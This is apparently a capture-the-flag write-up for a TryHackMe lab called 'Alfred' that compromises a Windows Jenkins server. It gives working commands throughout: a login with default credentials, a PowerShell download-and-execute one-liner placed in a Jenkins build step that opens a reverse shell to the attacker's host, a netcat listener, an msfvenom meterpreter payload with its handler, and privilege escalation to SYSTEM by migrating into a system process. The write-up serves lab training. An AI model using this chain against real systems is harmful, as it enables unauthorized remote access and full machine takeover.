# Alfred



## Recon



### nmap

```nmap
# Nmap 7.91 scan initiated Tue Mar 16 23:54:51 2021 as: nmap -sC -sV -Pn -p- -oA nmap/alfred 10.10.138.219
Nmap scan report for 10.10.138.219
Host is up (0.015s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-03-15T22:29:35
|_Not valid after:  2021-09-14T22:29:35
|_ssl-date: 2021-03-16T23:57:04+00:00; 0s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 16 23:57:04 2021 -- 1 IP address (1 host up) scanned in 133.06 seconds
```



## Jenkins



![login](/home/boolean/notes/tryhackme/assets/alfred-login.png)

Default credentials of admin:admin; allow us to login.



### Using Jenkins to perform a system command that will upload a script that creates a reverse tcp shell.

Within the existing project we can modify the build step to perform windows commands



![alfred-config-proj](/home/boolean/notes/tryhackme/assets/alfred-config-proj.png)

![alfred-build](/home/boolean/notes/tryhackme/assets/alfred-build.png)

We add in the command below into the build step, when the build is triggered it will attempt to download and execute the script ```powershell Invoke-PowerShellTcp.ps1 ```, creating a reverse shell on Port 9001

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.7.51/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.7.51 -Port 9001
```



## Foothold



Before triggering a build of the project we need to do 2 prepatory steps.

1. Start a webserver from where the script can be downloaded from.
2. Setup a netcat listener on port 9001



### Starting Webserver

Before starting ensure you have the ```powershell Invoke-PowerShellTcp.ps1 ``` in the current working directory

```bash
$ sudo python3 -m http.server 80
```



### Setup a netcat listener

```bash
nc -lvnp 9001
```



### Triggering the build

Use the build now option to initiate a build.

The build will fail, but that the command will execute.

![alfred-build-now](/home/boolean/notes/tryhackme/assets/alfred-build-now.png)



1. The script is downloaded by the victim server
2. Returns a powershell command prompt

![alfred-foothold](/home/boolean/notes/tryhackme/assets/alfred-foothold.png)



## Privesc



To make privesc easier we are going to switch from the existing TCP reverse shell to a meterpreter shell.



### Migrating to Meterpreter Shell

1. Create a Meterpreter Shell Payload using msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.7.51 LPORT=9003 -f exe -o shell9003.exe
```



2. Following the steps used to gain a foot hold, the build step needs to be edited to download the new payload and trigger a build once more. Alternatively you can use the shell thats already been created. The new command should look as follows:

   ```powershell
   powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.7.51/shell9003.exe','shell9003.exe')"
   ```

3. Use the following commands within msfconsole to setup a meterpreter listener

   ```bash
   msf6 > use exploit/multi/handler 
   msf6 > set PAYLOAD windows/meterpreter/reverse_tcp 
   msf6 > set LHOST 10.11.7.51 
   msf6 > set LPORT 9003 
   msf6 > run
   ```

4. When ready to execute use the following command to trigger the exe

   ```powershell
   Start-Process "shell9003.exe"
   ```

   

This should return a meterpreter session

![alfred-meterpreter](/home/boolean/notes/tryhackme/assets/alfred-meterpreter.png)



```bash
meterpreter > shell
Process 2684 created.
Channel 1 created.     
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
                                                    
C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv
                                                    
PRIVILEGES INFORMATION                  
----------------------
                                                    
Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled  
SeUndockPrivilege               Remove computer from docking station      Disabled  
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled                                                                                                                                 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                                                                                                                                
SeTimeZonePrivilege             Change the time zone                      Disabled                                                                                                                                
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled                                                                                                                                
                                                                                                                                                                                                                  
C:\Program Files (x86)\Jenkins\workspace\project>background                                                                                                                                                       
background                                                                                                                                                                                                        
'background' is not recognized as an internal or external command,                                                                                                                                                
operable program or batch file.                                                                                                                                                                                   
                                                                                                                                                                                                                  
C:\Program Files (x86)\Jenkins\workspace\project>exit                                                                                                                                                             
exit                                                                                                                                                                                                              
meterpreter > load incognito                                                                                                                                                                                      
Loading extension incognito...Success.                                                                                                                                                                            
meterpreter > list_tokens -g                                                                                                                                                                                      
[-] Warning: Not currently running as SYSTEM, not all tokens will be available                                                                                                                                    
             Call rev2self if primary process token is SYSTEM                                                                                                                                                     
                                                                                                                                                                                                                  
Delegation Tokens Available                                                                                                                                                                                       
========================================                                                                                                                                                                          
\                                                                                                                                                                                                                 
BUILTIN\Administrators                                                                                                                                                                                            
BUILTIN\IIS_IUSRS                                                                                                                                                                                                 
BUILTIN\Users                                                                                                                                                                                                     
NT AUTHORITY\Authenticated Users                                                                                                                                                                                  
NT AUTHORITY\NTLM Authentication                                                                                                                                                                                  
NT AUTHORITY\SERVICE                                                                                                                                                                                              
NT AUTHORITY\This Organization                                                                                                                                                                                    
NT AUTHORITY\WRITE RESTRICTED                                                                                                                                                                                     
NT SERVICE\AppHostSvc                                                                                                                                                                                             
NT SERVICE\AudioEndpointBuilder                                                                                                                                                                                   
NT SERVICE\BFE                                                                                                                                                                                                    
NT SERVICE\CertPropSvc                                                                                                                                                                                            
NT SERVICE\CscService                                                                                                                                                                                             
NT SERVICE\Dnscache                                                                                                                                                                                               
NT SERVICE\eventlog                                                                                                                                                                                               
NT SERVICE\EventSystem                                                                                                                                                                                            
NT SERVICE\FDResPub                                                                                                                                                                                               
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer  
NT SERVICE\MMCSS                 
NT SERVICE\PcaSvc                    
NT SERVICE\PlugPlay 
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\wscsvc

meterpreter > getuid
Server username: alfred\bruce
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 852   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 920   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 924   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 940   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 988   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1012  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1212  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1240  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1300  1832  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 1356  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1424  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1456  1300  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 1460  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1488  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1560  1456  shell9003.exe         x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\project\shell9003.exe
 1624  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1720  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1808  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1832  1624  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1856  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1940  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2124  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2340  772   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2460  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2544  668   taskhost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\taskhost.exe
 2868  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2944  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 3060  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe

meterpreter > migrate 668
[*] Migrating from 1560 to 668...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```

